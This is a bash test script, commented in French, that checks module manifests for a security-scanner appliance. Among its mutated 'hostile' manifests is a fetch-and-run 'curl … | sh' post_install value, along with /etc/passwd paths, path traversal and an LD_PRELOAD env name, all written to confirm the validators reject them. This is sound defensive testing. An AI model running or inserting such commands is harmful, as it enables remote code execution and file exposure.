#!/usr/bin/env bash
# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (C) 2026 Vincent Tisseront
#
# b10 — modules du catalogue (docs/MODULES.md), sans root ni conteneur :
#   - catalog/schema/module.schema.json : draft 2020-12 valide, et chargé par le
#     validateur de l'appliance (sous-ensemble de scanoria/schema.py) ;
#   - chaque modules/<id>/module.yaml : conforme, id = dossier, en-tête SPDX,
#     défauts d'options conformes, requires/conflicts cohérents, banc d'essai
#     sans lien ni fichier spécial ;
#   - manifestes hostiles refusés (image par étiquette, champ inconnu, option
#     sans défaut, id avec « .. »…) par les deux validateurs ;
#   - sorties natives enregistrées (modules/<id>/tests/recorded.sarif) :
#     structure SARIF 2.1.0 et attentes testbed.expect satisfaites ;
#   - .gitleaks.toml : seule exception, modules/<id>/testbed/.
# Le passage réel des scanners en conteneur confiné est dans b10-live.sh
# (job CI modules-testbed-live).
# Dépendances : bash, python3, python3-yaml, python3-jsonschema, jq.

# shellcheck disable=SC2016,SC2015
set -euo pipefail
export PYTHONDONTWRITEBYTECODE=1

ROOT=$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)
MC="$ROOT/tests/lib/modcheck.py"
TMP=$(mktemp -d)
trap 'rm -rf "$TMP"' EXIT

PASS=0
FAIL=0
ok() { PASS=$((PASS + 1)); printf 'ok   %s\n' "$1"; }
ko() { FAIL=$((FAIL + 1)); printf 'FAIL %s\n' "$1"; }
check() {
	local label=$1
	shift
	if "$@" > "$TMP/last.log" 2>&1; then ok "$label"; else ko "$label"; sed 's/^/     /' "$TMP/last.log" | head -n 30; fi
}
refused() { # libellé fichier motif-attendu
	if python3 "$MC" manifest "$2" > "$TMP/last.log" 2>&1; then
		ko "$1 : accepté à tort"
	elif sed 's/^[^:]*: //' "$TMP/last.log" | grep -qF -- "$3"; then
		ok "$1"
	else
		ko "$1 : refusé, mais sans le motif « $3 »"
		sed 's/^/     /' "$TMP/last.log" | head -n 10
	fi
}
for t in python3 jq; do command -v "$t" > /dev/null || { echo "outil manquant : $t" >&2; exit 2; }; done
python3 -c 'import yaml, jsonschema' 2> /dev/null || { echo "python3-yaml et python3-jsonschema requis" >&2; exit 2; }

# --- 1. Schéma ---------------------------------------------------------------------------
check "module.schema.json : draft 2020-12 et sous-ensemble de l'appliance" python3 -c '
import sys; sys.path.insert(0, sys.argv[1]); import modcheck; modcheck.load_schema()' "$ROOT/tests/lib"
check "module.schema.json : en-tête SPDX dans \$comment" \
	jq -e '."$comment" | test("SPDX-License-Identifier: AGPL-3.0-or-later")' "$ROOT/catalog/schema/module.schema.json"

# --- 2. Modules du dépôt -----------------------------------------------------------------
check "modules du dépôt conformes (schéma, liens, bancs d'essai)" python3 "$MC" repo "$ROOT"
for id in gitleaks osv-scanner trivy trivy-db osv-db; do
	[[ -f "$ROOT/modules/$id/module.yaml" ]] && ok "module présent : $id" || ko "module absent : $id"
done
for f in "$ROOT"/modules/*/module.yaml; do
	id=$(basename "$(dirname "$f")")
	python3 - "$f" > "$TMP/m.json" <<'EOF'
import json, sys, yaml
print(json.dumps(yaml.safe_load(open(sys.argv[1], encoding="utf-8"))))
EOF
	type=$(jq -r .type "$TMP/m.json")
	if [[ "$type" == scanner ]]; then
		check "$id : sortie native enregistrée conforme aux attentes du banc d'essai" \
			python3 "$MC" expect "$f" "$ROOT/modules/$id/tests/recorded.sarif"
		# Seule exception hors DAST : le réseau interne d'un service (contrat 12 de la 0.4, b17).
		check "$id : réseau coupé pendant l'analyse" jq -e '.scan.network == "none" or (.scan.network | startswith("service:"))' "$TMP/m.json"
		check "$id : licence vérifiée en amont (date)" jq -e '.license.verified_at | test("^2026-")' "$TMP/m.json"
	fi
done
leak=$(grep -rlE 'claude|/home/|/Users/' "$ROOT"/modules/*/tests/ 2> /dev/null || true)
[[ -z "$leak" ]] && ok "sorties enregistrées sans chemin local" || ko "chemins locaux dans : $leak"

# --- 3. Manifestes hostiles --------------------------------------------------------------
# Chaque cas part du manifeste gitleaks (valide) et y applique une mutation.
python3 - "$ROOT/modules/gitleaks/module.yaml" "$ROOT/modules/trivy-db/module.yaml" "$TMP" <<'EOF'
import copy, json, sys, yaml
base = yaml.safe_load(open(sys.argv[1], encoding="utf-8"))
feed = yaml.safe_load(open(sys.argv[2], encoding="utf-8"))
out = sys.argv[3]
DIG = "@sha256:" + "a" * 64

def mut(name, fn, src=base):
    m = copy.deepcopy(src)
    fn(m)
    with open(f"{out}/hostile-{name}.yaml", "w", encoding="utf-8") as f:
        yaml.safe_dump(m, f, allow_unicode=True)

def setp(path, value):
    def fn(m):
        cur = m
        for k in path[:-1]:
            cur = cur[k]
        cur[path[-1]] = value
    return fn

def delp(path):
    def fn(m):
        cur = m
        for k in path[:-1]:
            cur = cur[k]
        del cur[path[-1]]
    return fn

mut("image-etiquette", setp(["image"], "ghcr.io/gitleaks/gitleaks:v8.30.1"))
mut("image-etiquette-et-empreinte", setp(["image"], "ghcr.io/gitleaks/gitleaks:latest" + DIG))
mut("image-nom-court", setp(["image"], "gitleaks/gitleaks" + DIG))
mut("image-empreinte-courte", setp(["image"], "ghcr.io/gitleaks/gitleaks@sha256:abc"))
mut("champ-inconnu", setp(["post_install"], "curl https://exemple.test | sh"))
mut("champ-inconnu-scan", setp(["scan", "privileged"], True))
mut("champ-inconnu-licence", setp(["license", "accepted"], True))
mut("option-sans-defaut", setp(["options", "properties", "seuil"], {"type": "integer"}))
mut("option-defaut-hors-type", setp(["options", "properties", "seuil"], {"type": "integer", "default": "dix"}))
mut("option-defaut-hors-bornes", setp(["options", "properties", "seuil"], {"type": "integer", "default": 0, "minimum": 1}))
mut("option-objet-imbrique", setp(["options", "properties", "sous"], {"type": "object", "default": {}}))
mut("option-ref", setp(["options", "properties", "seuil"], {"$ref": "#/x", "type": "integer", "default": 1}))
mut("option-nom-invalide", setp(["options", "properties", "Seuil-Max"], {"type": "integer", "default": 1}))
mut("options-ouvertes", setp(["options", "additionalProperties"], True))
mut("i18n-option-inconnue", setp(["options_i18n", "fantome"], {"fr": {"title": "x"}}))
mut("id-point-point", setp(["id"], "../gitleaks"))
mut("id-majuscules", setp(["id"], "GitLeaks"))
mut("id-trop-long", setp(["id"], "g" * 60))
mut("restriction-inconnue", setp(["license", "restrictions"], "aucune"))
mut("licence-url-http", setp(["license", "url"], "http://exemple.test/LICENSE"))
mut("type-inconnu", setp(["type"], "plugin"))
mut("categorie-inconnue", setp(["categories"], ["magie"]))
mut("scanner-sans-banc", delp(["testbed"]))
mut("scanner-sans-sortie", delp(["outputs"]))
mut("sarif-mauvaise-version", setp(["outputs", "sarif", "version"], "2.0.0"))
mut("sortie-hors-out", setp(["outputs", "sarif", "path"], "/etc/passwd"))
mut("sortie-absente-commande", setp(["outputs", "sarif", "path"], "/out/autre.sarif"))
mut("reseau-cible-hors-dast", setp(["scan", "network"], "target"))
mut("reseau-hote", setp(["scan", "network"], "host"))
mut("banc-attente-vide", setp(["testbed", "expect"], []))
mut("banc-attente-sans-regle", setp(["testbed", "expect"], [{"min": 1}]))
mut("feed-https-sans-https", setp(["feed", "source"], {"kind": "https", "ref": "ftp://exemple.test/x.zip"}), feed)
mut("banc-attente-zero", setp(["testbed", "expect"], [{"rule": "jwt", "min": 0}]))
mut("banc-chemin-sortant", setp(["testbed", "path"], "../trivy/testbed"))
mut("banc-chemin-absolu", setp(["testbed", "path"], "/etc"))
mut("appliance-sans-operateur", setp(["requires", "appliance"], "0.2.0"))
mut("requires-incomplet", delp(["requires", "feeds"]))
mut("needs-feeds", setp(["needs", "feeds"], ["trivy-db"]))
mut("env-nom-invalide", setp(["scan", "env"], {"LD_PRELOAD;x": "1"}))
mut("commande-point-point", setp(["scan", "command"], ["gitleaks", "dir", "/src/../etc", "--report-path", "/out/result.sarif"]))
mut("ressources-negatives", setp(["resources", "min_ram_mb"], -1))
mut("scanner-avec-hostname", setp(["hostname"], "gitleaks"))
mut("feed-avec-scan", setp(["scan"], base["scan"]), feed)
mut("feed-sans-bloc-feed", delp(["feed"]), feed)
mut("feed-montage-hors-feeds", setp(["feed", "mount"], "/etc/trivy"), feed)
EOF
declare -A WHY=(
	[image-etiquette]=@sha256 [image-etiquette-et-empreinte]=@sha256 [image-nom-court]=@sha256
	[image-empreinte-courte]=@sha256 [champ-inconnu]=post_install [champ-inconnu-scan]=privileged
	[champ-inconnu-licence]=accepted [option-sans-defaut]=default [option-defaut-hors-type]="défaut non conforme"
	[option-defaut-hors-bornes]="défaut non conforme" [option-objet-imbrique]=object [option-ref]='$ref'
	[option-nom-invalide]="nom d'option" [options-ouvertes]=False [i18n-option-inconnue]=fantome
	[id-point-point]=gitleaks [id-majuscules]=GitLeaks [id-trop-long]=ggg [restriction-inconnue]=aucune
	[licence-url-http]=https [type-inconnu]=plugin [categorie-inconnue]=magie [scanner-sans-banc]=testbed
	[scanner-sans-sortie]=outputs [sarif-mauvaise-version]=2.1.0 [sortie-hors-out]=passwd
	[sortie-absente-commande]="absent de scan.command" [reseau-cible-hors-dast]=dast [reseau-hote]=network
	[banc-attente-vide]=expect [banc-attente-sans-regle]=rule [feed-https-sans-https]=https [banc-attente-zero]=minimum [banc-chemin-sortant]=trivy [banc-chemin-absolu]=/etc
	[appliance-sans-operateur]=0.2.0 [requires-incomplet]=feeds [needs-feeds]="Additional properties" [env-nom-invalide]=LD_PRELOAD
	[commande-point-point]="chemin avec" [ressources-negatives]=minimum [scanner-avec-hostname]=null
	[feed-avec-scan]=schéma [feed-sans-bloc-feed]="'feed' is a required" [feed-montage-hors-feeds]=/etc/trivy
)
n=0
for f in "$TMP"/hostile-*.yaml; do
	name=$(basename "$f" .yaml)
	name=${name#hostile-}
	n=$((n + 1))
	refused "manifeste hostile refusé : $name" "$f" "${WHY[$name]:-schéma}"
done
[[ "$n" -eq "${#WHY[@]}" ]] && ok "tous les cas hostiles ont été joués ($n)" || ko "cas hostiles : $n joués, ${#WHY[@]} attendus"

# Les mêmes cas sont refusés par le validateur de l'appliance seul (celui de
# catalog/build.py et du helper), pas seulement par python3-jsonschema.
python3 - "$ROOT" "$TMP" > "$TMP/appliance.log" <<'EOF'
import glob, json, sys, yaml
sys.path.insert(0, sys.argv[1] + "/src/rootfs/usr/lib/scanoria/py")
from scanoria import schema
v = schema.Validator(json.load(open(sys.argv[1] + "/catalog/schema/module.schema.json")))
# Règles hors schéma (défaut d'option, nom d'option, env, commande) : modcheck seul.
semantic = {"option-defaut-hors-type", "option-defaut-hors-bornes", "option-nom-invalide",
            "i18n-option-inconnue", "env-nom-invalide", "commande-point-point", "sortie-absente-commande"}
for f in sorted(glob.glob(sys.argv[2] + "/hostile-*.yaml")):
    name = f.rsplit("hostile-", 1)[1][:-5]
    if name in semantic:
        continue
    if v.valid(yaml.safe_load(open(f, encoding="utf-8"))):
        print(name)
EOF
[[ ! -s "$TMP/appliance.log" ]] && ok "validateur de l'appliance : cas hostiles du schéma refusés" \
	|| ko "validateur de l'appliance : accepté à tort : $(tr '\n' ' ' < "$TMP/appliance.log")"

# --- 4. Attentes du banc d'essai sur des sorties falsifiées ------------------------------
jq '.runs[0].results = []' "$ROOT/modules/gitleaks/tests/recorded.sarif" > "$TMP/vide.sarif"
if python3 "$MC" expect "$ROOT/modules/gitleaks/module.yaml" "$TMP/vide.sarif" > /dev/null 2>&1; then
	ko "banc d'essai : une sortie sans résultat est refusée"
else ok "banc d'essai : une sortie sans résultat est refusée"; fi
jq '.version = "2.0.0"' "$ROOT/modules/gitleaks/tests/recorded.sarif" > "$TMP/v2.sarif"
if python3 "$MC" expect "$ROOT/modules/gitleaks/module.yaml" "$TMP/v2.sarif" > /dev/null 2>&1; then
	ko "banc d'essai : une sortie SARIF d'une autre version est refusée"
else ok "banc d'essai : une sortie SARIF d'une autre version est refusée"; fi
jq 'del(.runs[0].tool)' "$ROOT/modules/trivy/tests/recorded.sarif" > "$TMP/sans-outil.sarif"
if python3 "$MC" expect "$ROOT/modules/trivy/module.yaml" "$TMP/sans-outil.sarif" > /dev/null 2>&1; then
	ko "banc d'essai : une sortie sans tool.driver est refusée"
else ok "banc d'essai : une sortie sans tool.driver est refusée"; fi

# --- 5. Bancs d'essai et exceptions des contrôles du dépôt ------------------------------
mkdir -p "$TMP/mod/x/testbed"
ln -s /etc/passwd "$TMP/mod/x/testbed/lien"
check "banc d'essai : lien symbolique refusé" python3 -c '
import sys; sys.path.insert(0, sys.argv[1]); import modcheck
errs = modcheck.testbed_errors(sys.argv[2], {"testbed": {"path": "testbed/"}})
sys.exit(0 if any("lien symbolique" in e for e in errs) else 1)' "$ROOT/tests/lib" "$TMP/mod/x"
check "gitleaks : une seule exception, limitée aux bancs d'essai" python3 -c '
import re, sys, tomllib
c = tomllib.load(open(sys.argv[1], "rb"))
al = c.get("allowlists", [])
assert "allowlist" not in c, "ancienne syntaxe [allowlist]"
assert len(al) == 1 and set(al[0]) <= {"description", "paths"}, al
assert al[0]["paths"] == ["^modules/[^/]+/testbed/"], al[0]["paths"]
for p, expected in [("modules/gitleaks/testbed/.env", True), ("modules/gitleaks/module.yaml", False),
                    ("src/modules/x/testbed/a", False), ("webui/testbed/a", False)]:
    assert bool(re.search(al[0]["paths"][0], p)) == expected, p' "$ROOT/.gitleaks.toml"
check "SonarQube Cloud : bancs d'essai exclus" grep -q '^sonar.exclusions=.*modules/\*/testbed/\*\*' "$ROOT/sonar-project.properties"
check "ci.yml : osv-scanner exclut les bancs d'essai seulement" \
	grep -qF -- "--x-exclude 'r:/modules/[^/]+/testbed\$'" "$ROOT/.github/workflows/ci.yml"

hors=$(cd "$ROOT" && git ls-files -z -- '*package-lock.json' | python3 -c '
import json, sys
for name in sys.stdin.read().split("\0"):
    if name and not name.startswith("modules/"):
        pkgs = json.load(open(name, encoding="utf-8")).get("packages", {})
        if any(k.endswith("node_modules/minimist") and v.get("version") == "1.2.5" for k, v in pkgs.items()):
            print(name)')
[[ -z "$hors" ]] && ok "minimist 1.2.5 (exception dependency-review) absent hors des bancs d'essai" \
	|| ko "minimist présent hors des bancs d'essai : $hors (l'exception allow-ghsas ne le couvre pas)"
printf '\nb10 : %d réussis, %d échecs\n' "$PASS" "$FAIL"
[[ "$FAIL" -eq 0 ]]
